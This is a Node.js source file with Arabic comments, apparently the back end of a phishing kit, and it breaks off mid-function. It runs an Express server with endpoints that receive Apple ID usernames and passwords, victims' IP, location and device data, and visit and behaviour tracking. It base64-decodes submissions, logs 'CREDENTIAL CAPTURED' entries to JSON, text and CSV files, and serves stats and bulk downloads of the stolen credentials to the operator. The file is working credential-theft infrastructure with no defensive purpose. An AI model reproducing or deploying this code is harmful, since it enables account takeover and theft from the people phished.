// 📁 storage-server.js - Simple Storage Server (Node.js)

const express = require('express');
const fs = require('fs');
const path = require('path');
const app = express();
const PORT = 3000;

// Middleware
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// مجلدات التخزين
const storageDir = path.join(__dirname, 'storage');
const credentialsDir = path.join(storageDir, 'credentials');
const visitsDir = path.join(storageDir, 'visits');
const logsDir = path.join(storageDir, 'logs');

// إنشاء المجلدات إذا لم تكن موجودة
[storageDir, credentialsDir, visitsDir, logsDir].forEach(dir => {
    if (!fs.existsSync(dir)) {
        fs.mkdirSync(dir, { recursive: true });
    }
});

// 🔐 تشفير البيانات (بسيط)
function encrypt(text) {
    return Buffer.from(text).toString('base64');
}

// 🔓 فك التشفير
function decrypt(text) {
    return Buffer.from(text, 'base64').toString('utf-8');
}

// 📝 تسجيل البيانات
function logData(type, data) {
    const timestamp = new Date().toISOString().replace(/:/g, '-');
    const logFile = path.join(logsDir, `${type}_${timestamp}.json`);
    
    fs.writeFileSync(logFile, JSON.stringify(data, null, 2));
    console.log(`📝 Logged ${type}: ${logFile}`);
}

// 📊 نقطة النهاية لجمع بيانات الاعتماد
app.post('/api/collect/credentials', (req, res) => {
    try {
        const data = req.body;
        const timestamp = new Date().toISOString().replace(/:/g, '-');
        
        // حفظ في ملف JSON
        const filename = `credential_${timestamp}.json`;
        const filepath = path.join(credentialsDir, filename);
        
        // فك التشفير إذا كان مشفراً
        if (data.encrypted && data.data) {
            try {
                data.decrypted = JSON.parse(decrypt(data.data));
            } catch (e) {
                data.decrypted = "Decryption failed";
            }
        }
        
        fs.writeFileSync(filepath, JSON.stringify(data, null, 2));
        
        // حفظ في ملف نصي للقراءة السهلة
        const txtFile = path.join(credentialsDir, 'captured_credentials.txt');
        const logEntry = `
╔═══════════════════════════════════════════════════════════╗
║ 🎯 CREDENTIAL CAPTURED - ${new Date().toLocaleString()}  ║
╚═══════════════════════════════════════════════════════════╝
📧 Apple ID: ${data.decrypted?.appleId || data.appleId || 'N/A'}
🔑 Password: ${data.decrypted?.password || data.password || 'N/A'}
🌐 IP Address: ${data.decrypted?.ip || data.ip || 'N/A'}
📍 Location: ${data.decrypted?.location?.city || 'Unknown'}, ${data.decrypted?.location?.country || 'Unknown'}
📱 Device: ${data.decrypted?.device?.userAgent?.substring(0, 50) || 'Unknown'}
⏰ Time: ${new Date().toLocaleString()}
🆔 Session ID: ${data.decrypted?.sessionId || data.sessionId || 'N/A'}
─────────────────────────────────────────────────────────────
        `;
        
        fs.appendFileSync(txtFile, logEntry);
        
        // تسجيل في الكونسول
        console.log('\n' + '='.repeat(60));
        console.log('🎯 NEW CREDENTIAL CAPTURED!');
        console.log('📧 Apple ID:', data.decrypted?.appleId || data.appleId);
        console.log('🔑 Password:', data.decrypted?.password || data.password);
        console.log('🌐 IP:', data.decrypted?.ip || data.ip);
        console.log('⏰ Time:', new Date().toLocaleString());
        console.log('='.repeat(60) + '\n');
        
        // حفظ في ملف CSV
        const csvFile = path.join(credentialsDir, 'credentials.csv');
        const csvHeader = 'Timestamp,AppleID,Password,IP,Location,UserAgent\n';
        const csvEntry = `"${new Date().toISOString()}","${data.decrypted?.appleId || data.appleId}","${data.decrypted?.password || data.password}","${data.decrypted?.ip || data.ip}","${data.decrypted?.location?.city || 'Unknown'}","${data.decrypted?.device?.userAgent?.substring(0, 100) || 'Unknown'}"\n`;
        
        if (!fs.existsSync(csvFile)) {
            fs.writeFileSync(csvFile, csvHeader);
        }
        fs.appendFileSync(csvFile, csvEntry);
        
        res.json({ success: true, message: 'Credentials saved', filename });
        
    } catch (error) {
        console.error('Error saving credentials:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// 👀 نقطة النهاية لجمع بيانات الزيارات
app.post('/api/collect/visits', (req, res) => {
    try {
        const data = req.body;
        const timestamp = new Date().toISOString().replace(/:/g, '-');
        
        const filename = `visit_${timestamp}.json`;
        const filepath = path.join(visitsDir, filename);
        
        fs.writeFileSync(filepath, JSON.stringify(data, null, 2));
        
        // تسجيل في الكونسول
        console.log('👀 New visit from:', data.ip || 'Unknown IP');
        
        res.json({ success: true, message: 'Visit data saved' });
        
    } catch (error) {
        console.error('Error saving visit:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// 📊 نقطة النهاية لجمع بيانات السلوك
app.post('/api/collect/behavior', (req, res) => {
    try {
        const data = req.body;
        const timestamp = new Date().toISOString().replace(/:/g, '-');
        
        const filename = `behavior_${timestamp}.json`;
        const filepath = path.join(storageDir, 'behavior', filename);
        
        if (!fs.existsSync(path.join(storageDir, 'behavior'))) {
            fs.mkdirSync(path.join(storageDir, 'behavior'), { recursive: true });
        }
        
        fs.writeFileSync(filepath, JSON.stringify(data, null, 2));
        
        console.log('📊 Behavior data saved for session:', data.sessionId);
        
        res.json({ success: true, message: 'Behavior data saved' });
        
    } catch (error) {
        console.error('Error saving behavior:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// 📈 نقطة النهاية للإحصائيات
app.get('/api/stats', (req, res) => {
    try {
        const stats = {
            totalCredentials: 0,
            totalVisits: 0,
            last24Hours: {
                credentials: 0,
                visits: 0
            },
            topCountries: [],
            deviceStats: {}
        };
        
        // حساب بيانات الاعتماد
        if (fs.existsSync(credentialsDir)) {
            const credFiles = fs.readdirSync(credentialsDir)
                .filter(file => file.endsWith('.json'));
            stats.totalCredentials = credFiles.length;
            
            // آخر 24 ساعة
            const now = Date.now();
            const oneDayAgo = now - (24 * 60 * 60 * 1000);
            
            credFiles.forEach(file => {
                const filepath = path.join(credentialsDir, file);
                const stat = fs.statSync(filepath);
                if (stat.mtimeMs > oneDayAgo) {
                    stats.last24Hours.credentials++;
                }
            });
        }
        
        // حساب الزيارات
        if (fs.existsSync(visitsDir)) {
            const visitFiles = fs.readdirSync(visitsDir)
                .filter(file => file.endsWith('.json'));
            stats.totalVisits = visitFiles.length;
            
            const now = Date.now();
            const oneDayAgo = now - (24 * 60 * 60 * 1000);
            
            visitFiles.forEach(file => {
                const filepath = path.join(visitsDir, file);
                const stat = fs.statSync(filepath);
                if (stat.mtimeMs > oneDayAgo) {
                    stats.last24Hours.visits++;
                }
            });
        }
        
        res.json({ success: true, stats });
        
    } catch (error) {
        console.error('Error getting stats:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// 📄 نقطة النهاية لعرض البيانات
app.get('/api/data/credentials', (req, res) => {
    try {
        if (!fs.existsSync(credentialsDir)) {
            return res.json({ success: true, credentials: [] });
        }
        
        const files = fs.readdirSync(credentialsDir)
            .filter(file => file.endsWith('.json'))
            .sort()
            .reverse()
            .slice(0, 50); // آخر 50 فقط
        
        const credentials = files.map(file => {
            const filepath = path.join(credentialsDir, file);
            const content = JSON.parse(fs.readFileSync(filepath, 'utf8'));
            return {
                filename: file,
                timestamp: content.timestamp || fs.statSync(filepath).mtime,
                data: {
                    appleId: content.decrypted?.appleId || content.appleId,
                    ip: content.decrypted?.ip || content.ip,
                    location: content.decrypted?.location,
                    device: content.decrypted?.device
                }
            };
        });
        
        res.json({ success: true, credentials });
        
    } catch (error) {
        console.error('Error reading credentials:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// 📥 تحميل البيانات كملف
app.get('/api/download/:type', (req, res) => {
    try {
        const type = req.params.type;
        const timestamp = new Date().toISOString().replace(/:/g, '-');
        let filepath, filename;
        
        switch (type) {
            case 'credentials':
                filename = `credentials_${timestamp}.json`;
                filepath = path.join(storageDir, filename);
                
                // تجميع جميع بيانات الاعتماد
                const allCreds = [];
                if (fs.existsSync(credentialsDir)) {
                    const files = fs.readdirSync(credentialsDir)
                        .filter(file => file.endsWith('.json'));
                    
                    files.forEach(file => {
                        const content = JSON.parse(
